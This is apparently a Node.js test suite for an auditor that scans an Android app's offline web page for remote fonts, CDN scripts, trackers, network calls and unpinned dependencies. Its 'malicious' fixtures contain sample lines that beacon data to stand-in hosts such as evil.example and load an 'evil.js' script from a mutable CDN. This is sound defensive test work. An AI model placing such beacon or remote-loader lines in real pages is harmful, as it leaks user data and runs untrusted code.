'use strict';

const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const assert = require('node:assert/strict');

const auditor = require('../../tools/room6/offline_dependencies.cjs');

const {
  CATEGORIES,
  SEVERITIES,
  DEFAULT_FOCUS_LAB,
  lineAt,
  isExternalUrl,
  urlHost,
  analyzeCdnUrl,
  scanText,
  listCorpusFiles,
  auditRepository
} = auditor;

function writeTree(root, files) {
  for (const [relative, text] of Object.entries(files)) {
    const absolute = path.join(root, relative);
    fs.mkdirSync(path.dirname(absolute), { recursive: true });
    fs.writeFileSync(absolute, text);
  }
  return root;
}

function makeTempTree(prefix, files) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  writeTree(root, files);
  return root;
}

function snapshot(report, file) {
  return report.findings
    .filter((finding) => finding.path === file)
    .map((finding) => [finding.category, finding.kind, finding.severity, finding.line])
    .sort((a, b) => a[3] - b[3]);
}

const BENIGN_FILES = {
  'android/app/src/main/assets/web/focus_lab.html': `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<link rel="stylesheet" href="css/focus_lab.css">
</head>
<body>
<main id="sec-focus-lab" aria-label="Focus Lab"></main>
<script src="js/room6/focus_lab_dom.js"></script>
</body>
</html>
`,
  'android/app/src/main/assets/web/css/focus_lab.css': `@import url('tokens.css');
.lab-hero { background: url('images/lab_bg.png'); }
@font-face { font-family: 'FocusSerif'; src: url('../fonts/focus_serif.woff2') format('woff2'); font-display: swap; }
`,
  'android/app/src/main/assets/web/js/room6/focus_lab_dom.js': `const PROVENANCE = {
  sourceUrl: 'https://commons.wikimedia.org/credits'
};
function mountFocusLab() {
  return 'Focus Lab';
}
module.exports = { mountFocusLab };
`,
  'package.json': `{
  "name": "focus-lab-offline",
  "dependencies": {
    "core-timer": "1.2.3"
  }
}
`
};

const MALICIOUS_HTML = `<!doctype html>
<html lang="en">
<head>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
<script src="https://unpkg.com/freight@latest/dist/lib.js"></script>
<img src="https://www.google-analytics.com/collect?v=1" alt="pixel">
<style>@font-face{font-family:L;src:url('https://fonts.gstatic.com/f.woff2') format('woff2')}</style>
</head>
<body>
<main id="sec-focus-lab">
<script>
fetch('https://evil.example/collect');
gtag('event', 'click');
new XMLHttpRequest();
new WebSocket('wss://ws.example/sink');
new EventSource('/es');
navigator.sendBeacon('https://t.example/p', 'x');
</script>
</main>
</body>
</html>
`;

const MALICIOUS_CSS = `@import url('https://cdn.jsdelivr.net/npm/awes/style.css');
.stage { background: url('https://cdn.example.com/bg.webp'); }
`;

const MALICIOUS_JS = `'use strict';
const PROVENANCE = {
  sourceUrl: 'https://freight.example/credits'
};
new Image().src = 'https://t.example/px';
const loader = document.createElement('script');
loader.src = 'https://unpkg.com/freight@latest/evil.js';
`;

const MALICIOUS_PACKAGE_JSON = `{
  "name": "focus-lab",
  "dependencies": {
    "left-pad": "^1.3.0",
    "core": "~6.0.2",
    "any": "*",
    "latest-sh": "latest"
  },
  "devDependencies": {
    "git-dep": "github:user/repo",
    "tar-dep": "https://registry.example/x.tgz"
  }
}
`;

test('Q06 auditor: pure helpers classify urls and lines deterministically', () => {
  assert.equal(lineAt('a\nb\nc', 3), 2);
  assert.equal(isExternalUrl('https://cdn.example/x.js'), true);
  assert.equal(isExternalUrl('//cdn.example/x.js'), true);
  assert.equal(isExternalUrl('js/room6/focus_lab_dom.js'), false);
  assert.equal(isExternalUrl('/local/path.png'), false);
  assert.equal(urlHost('https://Fonts.Gstatic.com:443/f.woff2'), 'fonts.gstatic.com');
  assert.equal(urlHost('js/room6/local.js'), '');
  assert.deepEqual(analyzeCdnUrl('https://cdn.jsdelivr.net/npm/x@1.2.3/lib.js'),
    { host: 'cdn.jsdelivr.net', mutable: false, pinned: true });
  assert.deepEqual(analyzeCdnUrl('https://unpkg.com/freight@latest/lib.js'),
    { host: 'unpkg.com', mutable: true, pinned: false });
  assert.deepEqual(analyzeCdnUrl('https://cdn.jsdelivr.net/npm/awes/lib.js'),
    { host: 'cdn.jsdelivr.net', mutable: true, pinned: false });
  assert.deepEqual(analyzeCdnUrl('https://evil.example/x.js'),
    { host: 'evil.example', mutable: false, pinned: true });
});

test('Q06 benign fixture: verdict clean, only provenance-level info', () => {
  const root = makeTempTree('q06-benign-', BENIGN_FILES);
  const report = auditRepository(root);
  const blocking = report.findings.filter((f) => f.severity === 'error' || f.severity === 'warn');
  assert.deepEqual(blocking, []);
  assert.equal(report.verdict, 'clean');
  assert.equal(report.focusLabPage, 'android/app/src/main/assets/web/focus_lab.html');

  const corpusRoles = report.scanned.map((entry) => [entry.role, entry.focusLab]);
  assert.deepEqual(corpusRoles, [
    ['focus-lab-asset', true],
    ['focus-lab-page', true],
    ['focus-lab-asset', true],
    ['dependency-manifest', false]
  ]);

  const infos = report.findings.filter((f) => f.severity !== null);
  const provenance = report.findings.filter((f) => f.kind === 'provenance-metadata');
  assert.equal(provenance.length, 1);
  assert.equal(provenance[0].path, 'android/app/src/main/assets/web/js/room6/focus_lab_dom.js');
  assert.equal(provenance[0].line, 2);
  assert.equal(infos.length, provenance.length, 'benign tree yields info-level provenance references only');

  assert.ok(report.notTested.some((entry) => entry.path === 'runtime' && /NOT_TESTED/.test(entry.reason)));
  fs.rmSync(root, { recursive: true, force: true });
});

test('Q06 malicious fixture page: fonts, CDN, tracking, network, unpinned CDN, missing SRI', () => {
  const root = makeTempTree('q06-evil-', {
    'android/app/src/main/assets/web/focus_lab.html': MALICIOUS_HTML
  });
  const report = auditRepository(root);
  assert.equal(report.verdict, 'findings');
  assert.equal(report.summary.bySeverity.error, 12);
  assert.equal(report.summary.bySeverity.warn, 1);

  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.REMOTE_FONT), [
    [CATEGORIES.REMOTE_FONT, 'font-host-stylesheet', SEVERITIES.ERROR, 4],
    [CATEGORIES.REMOTE_FONT, 'css-font-face-remote', SEVERITIES.ERROR, 7]
  ]);
  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.CDN_RESOURCE), [
    [CATEGORIES.CDN_RESOURCE, 'script-tag', SEVERITIES.ERROR, 5]
  ]);
  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.TRACKING), [
    [CATEGORIES.TRACKING, 'tracker-host', SEVERITIES.ERROR, 6],
    [CATEGORIES.TRACKING, 'tracker-function', SEVERITIES.ERROR, 13]
  ]);
  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.NETWORK_CALL), [
    [CATEGORIES.NETWORK_CALL, 'fetch-call', SEVERITIES.ERROR, 12],
    [CATEGORIES.NETWORK_CALL, 'xhr', SEVERITIES.ERROR, 14],
    [CATEGORIES.NETWORK_CALL, 'websocket', SEVERITIES.ERROR, 15],
    [CATEGORIES.NETWORK_CALL, 'eventsource', SEVERITIES.ERROR, 16],
    [CATEGORIES.NETWORK_CALL, 'beacon', SEVERITIES.ERROR, 17]
  ]);
  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.MUTABLE_DEPENDENCY), [
    [CATEGORIES.MUTABLE_DEPENDENCY, 'unpinned-cdn', SEVERITIES.ERROR, 5]
  ]);
  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/focus_lab.html').filter((f) => f[0] === CATEGORIES.MISSING_INTEGRITY), [
    [CATEGORIES.MISSING_INTEGRITY, 'stylesheet-tag', SEVERITIES.WARN, 4],
    [CATEGORIES.MISSING_INTEGRITY, 'script-tag', SEVERITIES.ERROR, 5]
  ]);

  const unpinned = report.findings.find((f) => f.kind === 'unpinned-cdn');
  assert.match(unpinned.evidence, /freight@latest/);
  fs.rmSync(root, { recursive: true, force: true });
});

test('Q06 malicious supporting modules: CSS import, load sinks and mutable ranges', () => {
  const root = makeTempTree('q06-evil2-', {
    'android/app/src/main/assets/web/focus_lab.html': '<!doctype html><html lang="en"><body><main id="sec-focus-lab"></main></body></html>',
    'android/app/src/main/assets/web/css/focus_lab.css': MALICIOUS_CSS,
    'android/app/src/main/assets/web/js/room6/focus_lab_telemetry.js': MALICIOUS_JS,
    'package.json': MALICIOUS_PACKAGE_JSON
  });
  const report = auditRepository(root);
  assert.equal(report.verdict, 'findings');

  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/css/focus_lab.css'), [
    [CATEGORIES.CDN_RESOURCE, 'css-import', SEVERITIES.ERROR, 1],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'unpinned-cdn', SEVERITIES.ERROR, 1],
    [CATEGORIES.CDN_RESOURCE, 'css-asset', SEVERITIES.WARN, 2]
  ]);

  assert.deepEqual(snapshot(report, 'android/app/src/main/assets/web/js/room6/focus_lab_telemetry.js'), [
    [CATEGORIES.REMOTE_REFERENCE, 'provenance-metadata', SEVERITIES.INFO, 3],
    [CATEGORIES.CDN_RESOURCE, 'script-tag', SEVERITIES.ERROR, 5],
    [CATEGORIES.CDN_RESOURCE, 'script-tag', SEVERITIES.ERROR, 7],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'unpinned-cdn', SEVERITIES.ERROR, 7]
  ]);

  const packageFindings = snapshot(report, 'package.json');
  assert.deepEqual(packageFindings.map((f) => [f[0], f[1], f[3]]), [
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 4],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 5],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 6],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 7],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 10],
    [CATEGORIES.MUTABLE_DEPENDENCY, 'package-range', 11]
  ]);
  assert.ok(packageFindings.every((f) => f[2] === SEVERITIES.ERROR));
  fs.rmSync(root, { recursive: true, force: true });
});

test('Q06 real checkout: Focus Lab page absent is reported NOT_TESTED, room6 module is clean', () => {
  const report = auditRepository();
  assert.equal(report.schemaVersion, 1);
  assert.equal(report.focusLabPage, null);
  assert.ok(report.notTested.some((entry) => entry.path === DEFAULT_FOCUS_LAB && /Focus Lab page absent/.test(entry.reason)));

  const room6 = report.scanned.filter((entry) => entry.role === 'room6-module');
  assert.ok(room6.some((entry) => entry.path === 'android/app/src/main/assets/web/js/room6/reading_view_adapter.js'));

  const room6Findings = report.findings.filter((finding) => finding.path.startsWith('android/app/src/main/assets/web/js/room6/'));
  assert.deepEqual(room6Findings, []);

  const blocking = report.findings.filter((f) => f.severity !== SEVERITIES.INFO);
  assert.deepEqual(blocking, []);
  assert.equal(report.verdict, 'clean');

  const missingReport = auditRepository(); // idempotent, read-only repeat
  assert.equal(missingReport.verdict, report.verdict);
  assert.equal(missingReport.summary.total, report.summary.total);
});

test('Q06 auditor itself stays offline, write-free and textContent-safe', () => {
  const source = fs.readFileSync(
    path.join(__dirname, '..', '..', 'tools', 'room6', 'offline_dependencies.cjs'),
    'utf8'
  );
  assert.doesNotMatch(source, /writeFile|appendFile|symlink\(|unlink|rm\(/, 'auditor must never mutate the disk');
  assert.doesNotMatch(source, /\binnerHTML\b/, 'reports are data for textContent consumers');
  assert.doesNotMatch(source, /https?:\/\/(?!no-op)/, 'auditor source must contain no remote endpoints');
  assert.doesNotMatch(source, /require\(['"]node:(?:net|tls|http|https|dns|child_process|fetch['"])/, 'no network or process modules');

  scanText('const x = 1;', '.js', 'x.js');
  const reportShape = auditRepository(makeTempTree('q06-empty-', {}));
  assert.equal(reportShape.summary.total, 0);
  fs.rmSync(path.dirname(reportShape.root) === path.dirname(process.env.TMPDIR || os.tmpdir())
    ? reportShape.root : reportShape.root, { recursive: true, force: true });
});
